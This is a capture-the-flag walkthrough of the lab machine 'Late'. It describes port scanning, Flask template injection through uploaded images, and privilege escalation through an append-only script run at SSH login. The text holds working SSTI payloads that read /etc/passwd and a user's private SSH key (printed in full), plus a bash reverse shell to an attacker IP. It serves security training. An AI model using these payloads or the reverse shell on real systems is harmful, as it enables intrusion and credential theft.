# Late

![](images/late.png)

IP: 10.129.166.198

## Nmap - Port Scan
### All ports
```bash
$ sudo nmap -p- --min-rate=1000 -T4 10.129.166.198

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service & Safe Scripts
```bash
$ sudo nmap -sC -sV -p 22,80 10.129.166.198 -o nmap.txt

Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-25 19:09 AWST
Nmap scan report for 10.129.166.198
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds
```

## Port 80 - HTTP
Browsing to http://10.129.166.198 a web page of what it seems to be a photo editing service is loaded. Looking at the source-code we can see some references to 2 hosts:
- late.htb
- images.late.htb
![](images/image1.png)

Lets add it to our `/etc/hosts` file:
```
10.129.166.198  late.htb images.late.htb
```

Now we can access http://images.late.htb/:
![](images/image2.png)

If we pay attention, the title says "Flask", and this framework is known for Server-Side-Template-Injection issues. So if this application turn images into text we could pottenctially send an image containing a SSTI payload to test.

### Testing for Flask SSTI
Lets start with the most simple payload: `{{7*7}}`. We can simply open any text editor, type in the payload, zoom in, and take a screenshot like below:
![](images/7x7.png)
Now we upload image to the website.

![](images/image3.png)

The application send us a text file of the results. Opening the `results.txt` file we see:
```
<p>49
</p>
```

This means that the application/server executed a simple 7x7 mathematic equation, in another words, we have remote command execution.

## Foothold
Moving to another level now, lets see if we can get the `/etc/passwd` file. Googling around we can find multiple web sites with Flask SSTI payloads, after trying a couple ones  I found [this](https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e) one to be working:
```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

*While testing the SSTI payloads, I found out that some fonts works better than others, and we need to have a very clear screenshot of the payload. To circunvent this, I used [Figma](https://www.figma.com) to create my screenshots.*

![](images/passwd.png)

And we got the `results.txt`:
```
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
</p>
```

Searching for users in the `/etc/passwd` file we note the line:
```
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
```

Which seems to be an interesting user with a `home` and a bash tty. During the nmap scan we saw that the SSH port is open. Using a guessing game, we can try to retrieve the SSH private key for this user. The payload looks like this:
```
{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read()  
}}
```

I had to change the font to `Roboto` to make it work this time!
And the image generated in Figma:
![](images/ssh_idrsa.png)

And the `results.txt`:
```
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```

We can create a file with the contents, give it the right permissions(600) to the file and use it to SSH as `svs_acc` user.

```bash
$ ssh -i svc_acc.idrsa svc_acc@10.129.166.198
```

## Path to Root
Using `pspy` we notice that there is a cronjob creating a bash script and setting the owner as `svc_acc` user.
It creates the following file:
```bash
/usr/local/sbin/ssh-alert.sh
```

With the contents:
```bash
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

Using `lsattr` we see that we cannot edit the file contents but we can append!
```bash
svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh
-----a--------e--- ssh-alert.sh
```

It seems that the script is executed as `root` when someone SSH in.

## Privilege Escalation to Root
We have "append" permissions over this file so we can simply add any system command in there and login with SSH to trigger the script.

### Read root flag
Lets make a copy of the `root` flag to `/tmp` directory:
```bash
echo 'cat /root/root.txt > /tmp/root.txt' >> /usr/local/sbin/ssh-alert.sh
```

### Get a root shell
Or we could simply add a reverse shell:
```bash
svc_acc@late:~$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.56/4444 0>&1"' >> /usr/local/sbin/ssh-alert.sh
svc_acc@late:~$ ssh localhost
```

In Kali we receive the reverse shell:
```bash
caue@kali:~/htb/late$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.166.198] 57468
bash: cannot set terminal process group (9654): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root.

```
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```